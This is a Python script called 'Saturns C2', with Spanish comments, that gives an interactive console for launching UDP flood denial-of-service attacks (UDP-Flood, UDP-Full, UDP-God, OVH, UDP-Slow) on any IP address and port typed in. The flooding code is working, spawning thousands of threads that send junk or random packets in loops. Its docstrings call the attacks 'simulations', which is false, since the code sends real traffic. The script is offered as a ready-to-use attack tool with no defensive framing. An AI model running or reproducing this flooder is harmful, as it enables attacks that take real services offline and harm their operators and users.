#!/usr/bin/env python3

import os
import sys
import socket
import threading
import time
from colorama import init, Fore, Style

# Inicializa colorama
init(autoreset=True)

# Variables globales
loops = 10000

# Logo actualizado
logo = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
                 Saturns C2
                   V : 1.0
              MADE BY : zJonch
             TEAM  : PouTeam/SexoTeam
"""

def clear_screen():
    """Limpia la pantalla"""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    """Muestra el banner de bienvenida"""
    print(Fore.LIGHTMAGENTA_EX + logo)

def show_help():
    """Muestra la ayuda con los comandos disponibles"""
    print(Fore.CYAN + "\nComandos disponibles:")
    print(Fore.YELLOW + "- help:" + Fore.WHITE + " Muestra esta lista de comandos")
    print(Fore.YELLOW + "- methods:" + Fore.WHITE + " Muestra los métodos disponibles\n")

def show_methods():
    """Muestra los métodos disponibles"""
    print(Fore.CYAN + "\nCategorías de métodos:")
    print(Fore.GREEN + "Layer 4:")
    print(Fore.YELLOW + "- UDP-Flood")
    print(Fore.YELLOW + "- UDP-Full")
    print(Fore.YELLOW + "- UDP-God")
    print(Fore.YELLOW + "- OVH")
    print(Fore.YELLOW + "- UDP-Slow\n")

def udp_flood_message():
    """Muestra el mensaje para UDP-Flood"""
    print(Fore.GREEN + "\nEjecutando UDP-Flood...")
    print(Fore.YELLOW + "Ctrol+c o z para detener el ataque")
    print(Fore.CYAN + "By SaturnC2")

def udp_full_message():
    """Muestra el mensaje para UDP-Full"""
    print(Fore.GREEN + "\nEjecutando UDP-Full...")
    print(Fore.YELLOW + "Ctrol+c o z para detener el ataque")
    print(Fore.CYAN + "By SaturnC2")

def udp_god_message():
    """Muestra el mensaje para UDP-God"""
    print(Fore.GREEN + "\nEjecutando UDP-God...")
    print(Fore.YELLOW + "Ctrol+c o z para detener el ataque")
    print(Fore.CYAN + "By SaturnC2")

def ovh_message():
    """Muestra el mensaje para OVH"""
    print(Fore.GREEN + "\nEjecutando OVH...")
    print(Fore.YELLOW + "Ctrol+c o z para detener el ataque manualmente")
    print(Fore.CYAN + "By SaturnC2")

def udp_slow_message():
    """Muestra el mensaje para UDP-Slow"""
    print(Fore.GREEN + "\nEjecutando UDP-Slow...")
    print(Fore.YELLOW + "Ctrol+z para detener el ataque")
    print(Fore.CYAN + "By SarurnC2")

def send_packet(ip, port, amplifier):
    """Simulación de envío de paquetes UDP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((ip, port))
        while True:
            s.send(b"\x99" * amplifier)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

def ovh_attack(ip, port, duration):
    """Simulación del ataque OVH"""
    payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    try:
        while time.time() < end_time:
            try:
                s.sendto(payload, (ip, port))
            except Exception as e:
                print(f"Error: {e}")
                break
    finally:
        s.close()

def udp_slow_attack(ip, port, threads, size):
    """Simulación del ataque UDP-Slow"""
    addr = (ip, port)
    for _ in range(threads):
        threading.Thread(target=SOC, args=(addr, size)).start()

def SOC(addr, size):
    try:
        for _ in range(250):
            if read():  # Detener si `read()` retorna True
                break
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            threading.Thread(target=UDP_ATTACK, args=(s, size, addr)).start()
    except Exception as e:
        print(f"Error en SOC: {e}")

def UDP_ATTACK(s, size, addr):
    try:
        if s is None:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_loader = os.urandom(size)
        bytes_loader2 = bytearray(os.urandom(size))
        for _ in range(2500):
            if read():  # Detener el ataque si `read()` retorna True
                break
            [s.sendto(bytes_loader, addr) for _ in range(5)]
            [s.sendto(bytes_loader2, addr) for _ in range(5)]
    except Exception as e:
        print(f"Error en UDP_ATTACK: {e}")
    finally:
        if s:
            s.close()

def read():
    """Simula la condición de detener el ataque"""
    # Cambia a True si necesitas detener el ataque en algún momento
    return False

def execute_method(method, ip, port, duration=None, threads=None, size=None):
    """Ejecuta el método seleccionado"""
    if method == "UDP-Flood":
        udp_flood_message()
        for _ in range(loops):
            threading.Thread(target=send_packet, args=(ip, port, 375), daemon=True).start()
    elif method == "UDP-Full":
        udp_full_message()
        for _ in range(loops):
            threading.Thread(target=send_packet, args=(ip, port, 750), daemon=True).start()
    elif method == "UDP-God":
        udp_god_message()
        for _ in range(loops):
            threading.Thread(target=send_packet, args=(ip, port, 375), daemon=True).start()
            threading.Thread(target=send_packet, args=(ip, port, 750), daemon=True).start()
    elif method == "OVH" and duration is not None:
        ovh_message()
        ovh_attack(ip, port, duration)
    elif method == "UDP-Slow" and threads is not None and size is not None:
        udp_slow_message()
        udp_slow_attack(ip, port, threads, size)
    else:
        print(Fore.RED + "Método desconocido o parámetros faltantes.")

def main():
    """Función principal"""
    clear_screen()
    show_banner()
    print(Fore.CYAN + "Escribe " + Fore.YELLOW + "'help'" + Fore.CYAN + " para ver la lista de comandos\n")

    while True:
        try:
            command = input(Fore.BLUE + "Saturn : ").strip()

            if command == "help":
                show_help()
            elif command == "methods":
                show_methods()
            elif command.startswith("UDP-Flood") or command.startswith("UDP-Full") or command.startswith("UDP-God") or command.startswith("OVH") or command.startswith("UDP-Slow"):
                parts = command.split()
                if len(parts) == 3 and parts[0] not in ["OVH", "UDP-Slow"]:
                    method, ip, port = parts[0], parts[1], int(parts[2])
                    execute_method(method, ip, port)
                elif len(parts) == 4 and parts[0] == "OVH":
                    method, ip, port, duration = parts[0], parts[1], int(parts[2]), int(parts[3])
                    execute_method(method, ip, port, duration)
                elif len(parts) == 5 and parts[0] == "UDP-Slow":
                    method, ip, port, threads, size = parts[0], parts[1], int(parts[2]), int(parts[3]), int(parts[4])
                    execute_method(method, ip, port, threads=threads, size=size)
                else:
                    print(Fore.RED + "Completa los campos..")
                    if "UDP-Flood" in command:
                        print(Fore.YELLOW + "Ejemplo: UDP-Flood [127.0.0.1] [80]")
                    if "UDP-Full" in command:
                        print(Fore.YELLOW + "Ejemplo: UDP-Full [127.0.0.1] [80]")
                    if "UDP-God" in command:
                        print(Fore.YELLOW + "Ejemplo: UDP-God [127.0.0.1] [80]")
                    if "OVH" in command:
                        print(Fore.YELLOW + "Ejemplo: OVH [127.0.0.1] [80] [10]")
                    if "UDP-Slow" in command:
                        print(Fore.YELLOW + "Ejemplo: UDP-Slow [127.0.0.1] [80] [5] [1024]")
            else:
                print(Fore.RED + "Comando desconocido. Escribe " + Fore.YELLOW + "'help'" + Fore.RED + " para ver los comandos disponibles")
        except KeyboardInterrupt:
            print(Fore.CYAN + "\nSaliendo...")
            sys.exit(0)
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    main()
